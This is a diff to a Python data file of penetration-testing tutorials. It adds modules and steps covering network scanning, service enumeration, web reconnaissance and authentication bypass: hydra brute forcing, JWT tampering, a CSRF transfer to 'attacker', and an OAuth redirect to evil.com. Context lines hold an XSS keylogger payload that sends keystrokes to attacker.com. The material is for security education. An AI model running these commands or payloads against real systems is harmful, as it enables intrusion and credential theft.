@@ -8,8 +8,51 @@ TUTORIALS = [
         'category': 'Reconnaissance',
         'tools': ['nmap', 'masscan', 'zmap', 'unicornscan'],
         'warning': 'Only perform these techniques on networks you own or have explicit permission to test.',
+        'modules': [
+            {
+                'id': 'basic-scanning',
+                'title': 'Module 1: Basic Network Scanning',
+                'description': 'Foundation scanning techniques and network discovery'
+            },
+            {
+                'id': 'advanced-nmap',
+                'title': 'Module 2: Advanced Nmap Techniques',
+                'description': 'Stealth scanning and OS fingerprinting'
+            },
+            {
+                'id': 'mass-scanning',
+                'title': 'Module 3: Large-Scale Network Scanning',
+                'description': 'High-speed scanning with Masscan and Zmap'
+            },
+            {
+                'id': 'service-enumeration',
+                'title': 'Module 4: Service Enumeration',
+                'description': 'Detailed service discovery and banner grabbing'
+            }
+        ],
         'steps': [
             {
+                'module': 'basic-scanning',
+                'title': 'Network Discovery and Host Enumeration',
+                'content': 'Learn fundamental network discovery techniques and host identification methods.',
+                'code': '''# Network discovery techniques
+ping -c 1 192.168.1.1
+fping -a -g 192.168.1.0/24
+nmap -sn 192.168.1.0/24
+
+# ARP scanning for local networks
+arp-scan -l
+arp-scan 192.168.1.0/24
+netdiscover -r 192.168.1.0/24
+
+# Basic port scanning
+nmap -F 192.168.1.100  # Fast scan
+nmap -p- 192.168.1.100  # All ports
+nmap -p 1-1000 192.168.1.100  # Port range''',
+                'explanation': 'Network discovery is the first step in reconnaissance, identifying live hosts and basic network topology.'
+            },
+            {
+                'module': 'advanced-nmap',
                 'title': 'Advanced Nmap Scanning Techniques',
                 'content': 'Learn to use advanced Nmap flags for stealth and comprehensive scanning.',
                 'code': '''# TCP SYN stealth scan with OS detection
@@ -27,6 +70,7 @@ nmap -T1 -sS target_ip  # Paranoid (very slow)''',
                 'explanation': 'These commands demonstrate various Nmap scanning techniques for different scenarios and stealth levels.'
             },
             {
+                'module': 'mass-scanning',
                 'title': 'Masscan for Large Network Ranges',
                 'content': 'Use Masscan for high-speed port scanning of large network ranges.',
                 'code': '''# Fast scan of entire Class C network
@@ -40,6 +84,7 @@ masscan -p1-1000 192.168.1.0/24 --rate=1000 -oX scan_results.xml''',
                 'explanation': 'Masscan is ideal for scanning large network ranges quickly, but requires careful rate limiting to avoid network congestion.'
             },
             {
+                'module': 'mass-scanning',
                 'title': 'Zmap for Internet-Wide Scanning',
                 'content': 'Learn to use Zmap for scanning the entire IPv4 address space.',
                 'code': '''# Scan entire internet for port 80
@@ -51,6 +96,33 @@ zmap -p 443 -B 10M -o https_hosts.txt
 # Scan specific networks
 echo "192.168.0.0/16" | zmap -p 22''',
                 'explanation': 'Zmap is designed for Internet-wide scanning. Use responsibly and consider the ethical implications.'
+            },
+            {
+                'module': 'service-enumeration',
+                'title': 'Service Detection and Banner Grabbing',
+                'content': 'Perform detailed service enumeration and banner grabbing for discovered ports.',
+                'code': '''# Service version detection
+nmap -sV 192.168.1.100
+nmap -sC -sV 192.168.1.100  # Default scripts + version detection
+
+# Banner grabbing with netcat
+nc -nv 192.168.1.100 80
+nc -nv 192.168.1.100 22
+
+# HTTP service enumeration
+curl -I http://192.168.1.100
+whatweb http://192.168.1.100
+nikto -h http://192.168.1.100
+
+# SMB enumeration
+enum4linux 192.168.1.100
+smbclient -L //192.168.1.100
+nbtscan 192.168.1.100
+
+# SNMP enumeration
+snmpwalk -v2c -c public 192.168.1.100
+onesixtyone -c community.txt 192.168.1.100''',
+                'explanation': 'Service enumeration reveals specific software versions and configurations, essential for vulnerability assessment.'
             }
         ]
     },
@@ -63,8 +135,58 @@ echo "192.168.0.0/16" | zmap -p 22''',
         'category': 'Web Security',
         'tools': ['burp-suite', 'sqlmap', 'gobuster', 'nikto'],
         'warning': 'These techniques should only be used on applications you own or have written authorization to test.',
+        'modules': [
+            {
+                'id': 'web-reconnaissance',
+                'title': 'Module 1: Web Application Reconnaissance',
+                'description': 'Discovery and mapping of web application structure'
+            },
+            {
+                'id': 'sql-injection',
+                'title': 'Module 2: Advanced SQL Injection',
+                'description': 'Complex SQL injection techniques and bypass methods'
+            },
+            {
+                'id': 'xss-exploitation',
+                'title': 'Module 3: Cross-Site Scripting (XSS)',
+                'description': 'Advanced XSS attacks and payload development'
+            },
+            {
+                'id': 'web-authentication',
+                'title': 'Module 4: Authentication Bypass',
+                'description': 'Breaking authentication and session management'
+            }
+        ],
         'steps': [
             {
+                'module': 'web-reconnaissance',
+                'title': 'Web Application Discovery and Mapping',
+                'content': 'Comprehensive web application reconnaissance and attack surface mapping.',
+                'code': '''# Directory and file enumeration
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js
+dirb http://target.com /usr/share/wordlists/dirb/common.txt
+
+# Technology stack identification
+whatweb http://target.com
+wappalyzer http://target.com
+nmap --script http-enum target.com
+
+# Subdomain enumeration
+subfinder -d target.com
+amass enum -d target.com
+dnsrecon -d target.com -t axfr
+
+# Web crawling and spidering
+wget --spider --recursive --no-directories --no-host-directories http://target.com
+burpsuite # Use spider functionality
+
+# SSL/TLS analysis
+sslscan target.com
+testssl.sh target.com''',
+                'explanation': 'Thorough reconnaissance identifies all possible attack vectors and application components.'
+            },
+            {
+                'module': 'sql-injection',
                 'title': 'Advanced SQL Injection Techniques',
                 'content': 'Explore advanced SQL injection methods beyond basic union attacks.',
                 'code': '''# Boolean-based blind SQL injection
@@ -81,6 +203,7 @@ sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,charencode''',
                 'explanation': 'Advanced SQL injection techniques for bypassing filters and exploiting blind injection vulnerabilities.'
             },
             {
+                'module': 'web-reconnaissance',
                 'title': 'Directory and File Enumeration',
                 'content': 'Advanced techniques for discovering hidden files and directories.',
                 'code': '''# Gobuster with custom wordlist and extensions
@@ -97,6 +220,7 @@ gobuster dir -u http://target.com/api -w /usr/share/wordlists/SecLists/Discovery
                 'explanation': 'These commands help discover hidden content and API endpoints that might contain vulnerabilities.'
             },
             {
+                'module': 'xss-exploitation',
                 'title': 'Advanced XSS Exploitation',
                 'content': 'Sophisticated cross-site scripting attack vectors and bypasses.',
                 'code': '''# DOM-based XSS payload
@@ -113,6 +237,33 @@ gobuster dir -u http://target.com/api -w /usr/share/wordlists/SecLists/Discovery
 # Keylogger payload
 <script>document.onkeypress=function(e){fetch('http://attacker.com/keys?key='+String.fromCharCode(e.which))}</script>''',
                 'explanation': 'Advanced XSS payloads for various scenarios and filter bypass techniques.'
+            },
+            {
+                'module': 'web-authentication',
+                'title': 'Authentication and Session Security Testing',
+                'content': 'Advanced techniques for bypassing authentication mechanisms and exploiting session management flaws.',
+                'code': '''# Brute force attacks
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+medusa -h target.com -u admin -P passwords.txt -M http -m DIR:/login
+
+# Session token analysis
+burpsuite # Analyze session tokens for predictability
+john --format=Raw-SHA256 session_tokens.txt
+
+# JWT token manipulation
+python3 jwt_tool.py -t http://target.com/api/protected -rh "Authorization: Bearer TOKEN"
+
+# Cookie security testing
+# Test for secure flags, httponly, samesite
+curl -v http://target.com/login -d "user=admin&pass=password"
+
+# CSRF token bypass
+curl -X POST http://target.com/transfer -H "Cookie: session=abc123" -d "amount=1000&to=attacker"
+
+# OAuth vulnerabilities
+# Test redirect_uri manipulation
+http://target.com/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=http://evil.com''',
+                'explanation': 'Authentication bypasses and session attacks are critical for gaining unauthorized access to web applications.'
             }
         ]
     },
